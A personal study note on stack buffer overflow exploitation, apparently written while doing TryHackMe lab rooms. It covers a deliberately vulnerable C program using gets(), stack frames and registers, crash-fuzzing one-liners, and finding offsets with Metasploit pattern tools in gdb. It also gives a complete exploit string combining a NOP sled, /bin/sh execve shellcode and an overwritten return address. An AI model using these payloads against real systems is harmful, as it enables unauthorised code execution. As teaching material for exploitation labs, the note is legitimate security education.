

#### Where to test buffer overflow

THM rooms and other exercises:
https://tryhackme.com/r/room/bof1 (Linux, r2 and gdb)
https://tryhackme.com/r/room/bufferoverflowprep (Windows, Immunity debugger)
https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/ (VM ISO)

Real world buffer overflow examples:
https://www.bleepingcomputer.com/news/security/you-can-bypass-authentication-on-hpe-ilo4-servers-with-29-a-characters/
https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit

Al tips:
"Hacking: The Art of Exploitation" book to check out
tool bofuzz

### What is Buffer Overflow

Buffer overflow is when vulnerable code allows us to writes over a bigger section of memory than it should.
The C functions gets(), strcopy(), sprintf, scanf and strcat() are examples of functions that doesn't check the available space before writing.

Example
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
<font size=2>When we enter up to 14 characters we get "Try again?". If we enter 15, we get "You have...". Since the string is null terminated when we enter 14 characters the int will be overwritten toooo. (We tested this be changing the init value and test value to 1.)</font>

### Low level program execution - Assembler

#### Memory layout

When a program is executed two main areas of the computers memory are used, the stack and the heap.
##### The stack

A thing you need to remember about the stack is that it grows downwards - This means that for example when space for a new variable is declared the adress of this will be lower than the last one declared.

The assembler instructions push and pop can be used to quickly add/remove something to/from the stack, like a plate on a stack of plates (the reason for the name stack).

Wh
- contains
	- Program counter
	- Saved registers
	- Other info
- stack frames
##### The heap
- grows upwards
- contains
	- dynamically assigned memory

#### Registers

A simplified description of the x86 processor
There are a number of registers, tiny bits of memory, with special purposes

The most important ones are:
- The Instruction pointer, ip, that keeps track of where in memory we are currently reading and executing instructions.
- The Stack pointer, sp, that keeps track of the memory address of the top of the stack.
- The Base pointer, bp, that keeps track of the memory address of current stack frame's start (aka Stack base pointer or Frame pointer)

There are also other registers, for example ax and bx, that have different specific functions in the execution of a program

##### Stack Frames

This means that for every function that is run a new bit of the stack is used. The old top of the stack (esp) will now be the base of the new Stack Frame (ebp). The stack frame will contain:
-  the old instruction pointer (eip)
- the old base pointer (ebp)
- other registers saved by the code (compiler/programmer)
- local variables
The new top of the stack (esp) will be the stack frames top.

As you can see in the images a buffer is addressed from the "bottom" as the stack is growing to lower memory addresses.

![[Images/KmWsaIs.png|250]]    ![[Images/lqE6o0S.png|275]]

And when we put to much data into the buffer and get a buffer overflow it will overwrite what was previously put on the stack. First other variables, then other saved registers and then the saved base pointer (ebp) and instruction pointer (eip).

![[Images/buffer_overflow_2.webp|700]]

When we later leave the function, this will all reverse. The saved base pointer and instruction pointer are read back into the registers we will get a segmentation fault if they don't contain usable values. We need to get the right values into the right places.

#### Program structure in asm

##### Call of function

Call does:
push eip            Saves the old instruction pointer to the stack
jmp function     Hops to the functions address

##### Function Prologue

A function starts with:
push ebp           Save the old base pointer to the stack
mov ebp, esp    Copies the old stack pointer as a new base pointer
push ebx           Push possible regs that will be used in the function
sub esp, 0x404  Make space for the functions variables.. on the stack (in this case a char buffer of 1024 characters)

##### Function Epilogue

A function end with:
leave      = mov esp, ebp   Save the old base pointer as a new stack pointer
         pop ebp            Get the old base pointer from the stack
ret          = pop eip            Get the old instruction pointer from the stack

Meaning leave and ret are really shorthand for these.


### Buffer Overflow
#### Is there a Buffer Overflow

First we need an input to test for overflow. It can be any other kind of input (user input, command line arguments, network commands, environment variables...).

We can perform basic tests where we try different input, increasing the size to see if the program crashes:
`python -c "print('A' * 64)" | ./<program>`
`python -c "print('A' * 100)" | ./<program>`
`python -c "print('A' * 64 + '\x64\x63\x62\x61')" | ./<program>`
`echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0" | ./<program>`
`perl -e 'print "A"x64 . "\x24\x84\x04\x08"' | ./<program>`

``./<program> `python -c "print('A' * 64 + '\x64\x63\x62\x61')"` ``
`./<program> $(python -c "print('A' * 64 + '\x64\x63\x62\x61')")`
`./<program> 'echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0"'`

#### Exploring memory (stack and heap)

When we find a buffer overflow vulnerability we need more information. We can use different tools to explore memory and to debug and step through program execution. Hopefully we can run the program in a debugger or attach to a process with a GUI debugger like like edb (Linux) or Immunity debugger (Windows).

Tools:
	Linux - [[r2 (radare2)]], [[gdb]], lldb, [[objdump]], readelf, edb (graphical)
	Windows - WinDbg, Immunity Debugger, (IDA)

The simplest might be objdump:
`objdump -d <program>` disassemble program to get function adress..

More complex with almost infinite possibilities tools like are gdb and r2...

Examples gdb:

Examples r2:


#### Non-repeating input

We want to see what part of the input we gave ends up where in memory. You can make a string to test with manually or use a tool.

Metasploit has two helpful scripts. One to generate a non-repetitive string and one to give us the offset (position) of a part of this string.

`/usr/share/metasploit-framework/tools/exploit/pattern-create.rb`
	`-l`, `--length <length>`         The length of the pattern
    `-s`, `--sets <ABC,def,123>`   Custom Pattern Sets
    `-h`, `--help`                             Show help
	`./pattern_create.rb -l 500` Creates a non-repetitive string with length 500

`/usr/share/metasploit-framework/tools/exploit/pattern-offset.rb`
    `-q`, `--query Aa0A`                 Query to Locate
    `-l`, `--length <length>`        The length of the pattern
    `-s`, `--sets <ABC,def,123>`  Custom Pattern Sets
    `-h`, `--help`                            Show help
	`./pattern_offset -l 500 -q 63413163` Returns the position of the 0x63413163`

##### Example

Confirm buffer overflow:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1200"))
Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Check length to instruction pointer:
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
gdb -q bow32
run $(cat pattern.txt)
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569        
[*] Exact match at offset 1036
```

Test position:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1036 + '\x66' * 4)")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Yay, we can set eip!

#### Find out how much space we have for shellcode



#### Using shell code

We want to put code in memory and then redirect execution to this memory.

Structure of the input:
`python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"`

Example:
`python -c "print('\x90'*30+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*60+'\xef\xbe\xad\xde')" | ./program`

#### Example shell code

Shell code that opens a basic shell (source THM)
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3
```

The shell code disassembled using r2, commands aaa and then pdf:
![[Images/Pasted image 20240809204245.png]]
<font size=2>A string containing the path to /bin/sh + 0x11 (random extra byte) is put in the RCX registry.<br>
To get rid of the extra 0x11 rcx is first shifted one byte to the left and then to the right.<br>
RCX is then pushed onto the stack.<br>
Other requirements for the syscall to exectue the path are prepared and then the syscall is made.</font>


We use a number of nop instructions to make the address of the exploit easier to get to. If we have 90 nops all addresses within these will lead execution to the shell code.

The next step is to change the value of the instruction pointer. This cannot be done directly as it is read only but the old value of the instruction pointer is saved to the stack when a function is called. This is where it can possibly be overwritten.

But to overwrite it we need to know the organization and contents on the stack and how the instruction pointer is saved there...





